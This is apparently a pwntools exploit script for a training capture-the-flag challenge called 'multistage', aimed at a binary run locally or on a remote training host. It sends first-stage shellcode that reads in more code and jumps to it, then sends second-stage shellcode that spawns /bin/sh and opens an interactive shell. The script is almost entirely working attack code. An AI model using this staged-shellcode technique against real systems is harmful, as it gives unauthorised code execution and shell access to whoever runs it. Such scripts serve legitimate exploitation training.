from pwn import *

COMMANDS = """
b *0x40123f
c
"""
context.arch = "amd64"

# python3 b.py DEBUG

if args.REMOTE:
    c = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./multistage", gdbscript=COMMANDS)
    else:
        c = process("./multistage")

c.recvuntil(b"\n ")

# call a read and save in the very next memory location after the shellcode
shellcode = """
add al, 0x0f
mov rsi, rax
xor eax, eax
xor edi, edi
mov dl, 100
syscall
jmp rsi
"""
shellcode_c = asm(shellcode)
c.send(shellcode_c)

# send new shellcode to open /bin/sh
# with the last jmp of the first shellcode we will execute the second one
shellcode_c = asm(shellcraft.sh())
c.send(shellcode_c)
c.interactive()